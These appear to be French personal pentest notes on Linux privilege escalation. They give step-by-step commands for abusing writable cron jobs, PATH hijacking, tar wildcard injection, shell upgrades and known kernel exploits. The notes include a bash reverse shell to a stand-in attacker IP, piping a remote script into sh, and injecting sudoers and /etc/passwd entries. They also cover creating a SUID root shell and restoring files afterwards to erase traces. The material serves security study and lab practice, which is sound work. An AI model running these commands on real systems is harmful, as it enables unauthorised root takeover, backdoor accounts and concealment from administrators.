**Rappel :**

![chmod_advanced.jpg](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/chmod_advanced.jpg)

Le sticky bit (désigné par T, qu'on peut ajouter avec +t) c'est un bit généralement alloué au repertoire. Il permet seulement aux propriétaire des fichiers/repo et au root de pouvoir supprimer et renommer les fichiers/repo, même si d'autre ont le droit de les modifier.

www-data : c'est le droit qu'utilise le server apache par exemple.

SUID bit : Quand il est activé sur un fichier, il s'execute avec les perm root sans même regarder celui qui l'execute.

To do list :

![privilege_escalation_privesc.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/privilege_escalation_privesc.png)

Programme d'énumération :

- Pour chopper le plus d'information possible, on va se servir de programme qui vont automatiser l'énumération :
    - LinEnum
    - Linpeas, on peut l'utiliser en faisant `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` ou sinon tu l'envoie en partage de fichier via ta machine. Penses aussi à faire `chmod 755 ./linpeas.sh`
    - linux-exploit-suggester, on peut l'utiliser en faisant `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh` apres tu fais `chmod 755 ./les.sh` et enfin `./les.sh`

# Jobs/Tasks

![cron.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/cron.png)

- Ces tâches se trouvent dans les fichiers cron dans /etc/.
- Le but c'est de trouver des tasks qu'on peut modifier en tant qu'attaquant. Généralement, c'est des customs jobs créées par l'user, les trucs générés automatiquement c'est souvent secure.
- Là on va donc chercher des tasks dont on a les droits d'écriture (w) avec nos permissions.
- Pour voir les cron jobs de base :
    - `cat /etc/crontab`
- Si y'a rien d'interréssant, faire :
    - `ls -l /etc/cron *`
- Tous ça c'est les tasks système, on veut maintenant les tasks faite par les users (les cachées) :
    - `ls -l /var/spool/cron/crontabs` // normalement t'as pas les perm (que tu peux check en faisant `ls -l /var/spool/cron | grep "crontabs"`)
- Normalement y'a le sticky bit activé donc il faut trouver autre chose. Par exemple avec linpeas, on peut voir plus d'info sur ça.
    - Tu pourrais voir en dessous de `SHELL=/bin/sh` et des 4 lignes des tasks cachées. Si y'a des repo en jaune et rouge, ça veut dire que t'as les perm d'écriture dedans.
    - A savoir que si y'a jaune+rouge, t'as 95%  de chance de pouvoir l'exploit pour la privesc.
    - Le plus important à voir c'est la variable PATH car elle définie où chercher quand on execute un program/fichier binaire.
    - Par exemple, si on a la variable `PATH:/dev/shm:/usr/local/sbin:/usr/local/bin` et qu'on a une cron tasks qui fait `systemctl list-units --type blabla`, bah pour chercher le fichier binaire systemctl, la machine cherchera d'abord dans `/dev/shm` puis dans `/usr/local/sbin` etc...(attention c'est seulement si c'est systemctl, parce que si on a le chemin absolu, il ne va pas chercher dans le path mais directement dans le chemin) Donc si on a dans le PATH un dossier où on peut écrire et créer des fichiers, on a gagné d'avance.
    - Pour voir où se trouve le fichier binaire systemctl, on fait `find / -iname systemctl 2>/dev/null` avec -iname pour ne pas être sensible à la casse.
    - On peut donc voir si on peut écrire dans un dossier qui se trouve avant le dossier qui contient systemctl dans le PATH.
    - Si t'en a un, tu peux donc créer sur ta machine attaquante un reverse shell ou ce que tu veux avec msfvenom puis tu la télécharge sur la cible + `chmod 755 ./filename`

- Y'a un autre truc qui est lié aussi c'est que la cron task va s'exécuter avec le SHELL= ? par exemple `/bin/sh -c "`command in cron job" donc en fait on peut juste mettre un script à la place d'un payload de msfvenom.
    - Par exemple : `echo 'echo "devops ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /dev/shm/systemctl` // ne jamais oublier de mettre `chmod 755`/dev/shm/systemctl pour qu'il ait les droits d'exec.
    - Ensuite tu peux check avec `sudo -l` pour voir si ça marche.

- Si tu n'as pas les permissions pour écrire dans un dossier, ça veut pas forcément dire que tu n'as pas les permissions pour écrire sur les fichiers dans ce dossier.
    - `ls -l /opt | grep "scripts"` // ça pourrait te renvoyer que tu n'as pas les permissions pour écrire
    - `ls -l /opt/scripts | grep "check-health.sh"` // ça pourrait te renvoyer que tu a les permissions pour écrire dedans.
    - Tu peux donc mettre ton payload à l'intérieur comme par exemple : `cp /bin/bash /tmp && chmod +s /tmp/bash` et tu le rajoute au début du script check-health.sh
    - Ensuite tu check le dossier /tmp pour voir si le fichier bash apparait avec le SUID bit : ls -l /tmp
    - Enfin si ça marche, tu peux donc lancer un shell en mode root (-p) : `/tmp/bash -p`

- Si par contre linpeas t'affiche le dossier qui contient la cron task en jaune/rouge, tu as les perm pour écrire dedans.
    - Donc si le fichier n'existe même pas dedans, tu peux le créer et mettre ton reverse shell dedans :
        - `echo '#!/bin/bash' > /opt/scripts/backup.sh`
        - `echo "" >> /opt/scripts/backup.sh`
        - `echo 'bash -i >& /dev/tcp/ip_attacker/port_attacker 0>&1' >> /opt/scripts/backup.sh`

- Si une cron job travaille dans un dossier auquel tu as accès/droit d'écriture, tu peux peut-être faire des Wildcard injection :
    - Imaginons que tu sois l'user www-data et qu'une cron task execute la commande :
        
        - `cd /var/www/html && tar -czf /root/website/backup.tar.gz *`
    - Étant donnée qu'on peut créer des fichiers dans ce dossier et que la commande prend en compte tous les fichiers, on pourrait créer un fichier qui utilise une wildcard pour faire une injection dans la commande tar. Pour tester si ça marche :
        
        - on peut créer un fichier : `touch '/var/www/html/--index-file=output.txt'`
            
        - la commande tar de la cron task va donc ressembler à un truc comme ça :
	             `tar -czf /root/website/backup.tar.gz --index-file=output.txt index.html info.php monkey.php webshell.php`

        - où les fichiers sont dans le dossier et notre fichier d'injection et interprété comme un switch. On va donc check si le fichier output.txt est bien créé. Si oui, et bah on peut l'exploiter.
            
    - Pour l'exploiter, on peut utiliser les switch `--checkpoint` et `--checkpoint-action` qui, quand la cron task va s'executer, le checkpoint va commencer et va donc trigger le checkpoint-action qui sera une commande qu'on voudra.
        
        - En premier lieu, on va créer un password qu'on va désigner comme le password de notre futur user rooté :
            - `openssl passwd "password"`  sur notre machine attaquante
        - Ensuite, on retourne sur notre cible et on va créer notre fichier shell (qu'on va nommé rootme.sh) qui sera executé par le checkpoint action :
            - `echo '#!/bin/bash' > /var/www/html/rootme.sh`
            - `echo "" >> /var/www/html/rootme.sh`
            - `echo 'echo "r00t:password_hashé:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /var/www/html/rootme.sh`
            - `chmod 755 ./rootme.sh`
            - On créer donc un user "r00t" qui aura les permissions d'un user root, et on aura le password.
        - Enfin, on créer nos deux fichiers qu'on va utiliser pour les 2 switch :
            - `touch '/var/www/html/--checkpoint=1'`
            - `touch '/var/www/html/--checkpoint-action=exec=sh rootme.sh'`
        - Maintenant y'a plus qu'à attendre de voir si l'user est bien placé dans le fichier `/etc/passwd`. Si oui, on pourra alors se mettre en root.

- Si on a trouvé aucune cron task avec linPEAS, on peut toujours essayé de chercher les cron tasks user qui sont stocké dans /va/spool/cron/crontabs mais inaccessible aux users.
    - On va d'abord check si cron tourne en fond, on aura peut-être une chance de l'exploit :
        - `ps -efw | grep -i "cron"`  Si tu vois une ligne avec cron lancé, y'a une chance.
    - Faut maintenant trouver des hidden cron jobs avec PsPy, un script pour lister tous les processus, voir les commandes que les autres users executent et plus encore je crois.
        - Il faut que la cible ait installé PsPy (ce qu'on peut faire nous même) puis tu fais `chmod 755 ./pspy64`
        - `./pspy64 `// Attend un peu pour voir si y'a des tâches qui s'executent toute les minutes par exemple. Par exemple tu pourrais voir une ligne `/usr/sbin/cron -f` suivie d'une ligne avec la commande. C'est encore mieux si c'est avec le UID=0 (en root)
    - Ensuite, suivant la commande executé, tu peux essayer de l'exploiter.
    - Imaginons qu'on ait la commande `/bin/bash -c /opt/scripts/test-connect.sh`, on va donc check si on a les permissions dans le dossier et sur le fichier
        - On va donc essayer de remplacer ce fichier avec le notre : on va le bouger vers un dossier où on pourra le modifier. `/dev/shm` par exemple :
            - `mv /opt/srcipts/test-connect.sh /dev/shm`  si quand on fait `ls -l /dev/shm`, on voit qu'on devient le propriétaire du fichier, on pourrai donc directement pouvoir modifier le fichier dans /opt/scripts/ mais je trouve ça bizarre donc part du principe que ça marche pas. Bref du coup dans le fichier on pourrait mettre :
            - `echo '#!/bin/bash' > /opt/scripts/test-connect.sh`
            - `echo "" >> /opt/scripts/test-connect.sh`
            - `echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' >> test-connect.sh`
            - C'est pour qu'on puisse lancer un shell avec le setuid à partir de /tmp.
        - Maintenant, on attend que le fichier bash dans /tmp ait le setuid. Quand tu l'as, t'as plus qu'à faire `/tmp/bash -p`
        - Pour effacer les traces, dans le shell root que t'as récupéré tu peux faire `mv /dev/shm/test-connect.sh /opt/scripts/` pour remettre le script de base dans le dossier `/opt/scripts` puis tu fais `chown root:root /opt/scripts/test-connect.sh` pour définir le propriétaire sur root. Maintenant, tout est redevenu comme avant et tu as un shell root.

# **Upgrade to full TTY**

Imagine que t'ai un shell pas interactif que t'as eu à travers ftp donc quand tu fais des commandes, t'as pas de réponse.

- Sur ta machine attaquante, tu lances nc : `nc -lnvp 443`
- Quand tu vas sur la cible et que tu fais ftp ip_attacker, c'est pas interactif.
- A la place, sur ta cible : `python3 -c 'import pty;pty.spawn("/bin/bash");' `// PTY c'est un module python pour faire spawn un processus shell séparé.
- Normalement, t'as un processus qui s'est lancé. Maintenant tu fais CTRL + Z pour revenir sur ta machine puis tu fais :
- `stty raw -echo`
- Toujours sur ta cible, tu fais `fg` ca devrais afficher `nc -lvpn 443` puis tu fais `export TERM=xterm` pour exporter le shell xterm pour avoir un full TTY
- Si tu retourne sur ta cible et que tu retente ftp ip_attacker, normalement tu devrais avoir un shell interactif (qui reçoit et envoie des outputs au programme)

# Wildcard injection

# Kernel Exploit

- Le kernel c'est ce qui se trouve entre le software et le hardware. Son jobs c'est de convertir les intput/output (I/O) en instruction pouvant faire intéragir hardware et software.
- Énumération pour du Kernel exploit :
    - `uname -a` ou `cat /proc/version`  voir la version du kernel
    - [https://en.wikipedia.org/wiki/Linux_kernel_version_history](https://en.wikipedia.org/wiki/Linux_kernel_version_history "https://en.wikipedia.org/wiki/Linux_kernel_version_history") pour voir à partir de quelle date les exploit qu'on va trouver fonctionneront.
    - `find / -perm -4000 2>/dev/null ` trouver les binary avec le SUID bit
    - `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh`
    - `gcc`  Pour check si on peut compiler notre exploit directement sur la machine (le meilleur des cas)
    - `find / -iname "gcc" 2>/dev/null` Si tu trouve vraiment rien pour le compiler, tu peux le compiler soit à partir de ta machine, soit à partir d'une vm.

## Cool Kernel Exploit :

- Pense à check si elles sont dans searchsploit, ça sera plus simple que de se faire chier avec les github.
- DirtyPipe :[](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits")
    - Link : [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits")
    - CVE : 2022-0847
    - Affected version(s) : 5.8 < 5.16.11
- Half-Nelson :
    - Link : [https://github.com/lucyoa/kernel-exploits/tree/master/half-nelson](https://github.com/lucyoa/kernel-exploits/tree/master/half-nelson "https://github.com/lucyoa/kernel-exploits/tree/master/half-nelson")
    - CVE : 2010-4073
    - Affected version(s) : 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36
- Full-Nelson :
    - Link : [https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson](https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson "https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson")
    - CVE : 2010-4258
    - Affected version : 2.6.31, 2.6.32, 2.6.35, 2.6.37
- Memodipper :
    - Link : [https://github.com/lucyoa/kernel-exploits/tree/master/memodipper](https://github.com/lucyoa/kernel-exploits/tree/master/memodipper "https://github.com/lucyoa/kernel-exploits/tree/master/memodipper")
    - CVE : 2012-0056
    - Affected version(s) : 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0
- DirtyCow / DirtyCow 2 :
    - Link : [https://github.com/dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io "https://github.com/dirtycow/dirtycow.github.io")
    - CVE : 2016-5195
    - Affected version(s) : 2.6.22 <= 3.9 (and some 4.x),
    - Patched version(s) : [https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions "https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions")
- eBPF Verifier :
    - Link : [https://github.com/tr3ee/CVE-2022-23222](https://github.com/tr3ee/CVE-2022-23222 "https://github.com/tr3ee/CVE-2022-23222")
    - CVE : 2022-23222
    - Affected version(s) : 4.4.0-x < 4.13.x

- Tips :
    - Si tu fais du privesc, généralement tous ce qui est partage de fichiers et tout, tu les met dans le dossier /dev/shm ou /tmp
    - Pour compiler un fichier C : `gcc exploit.c -o exploit`

- Ce sont des programmes qui permettent d'executer du code arbitraire avec des permissions élevées.

Trouver fichier avec un SUID :

- `find / -user root -perm /4000`
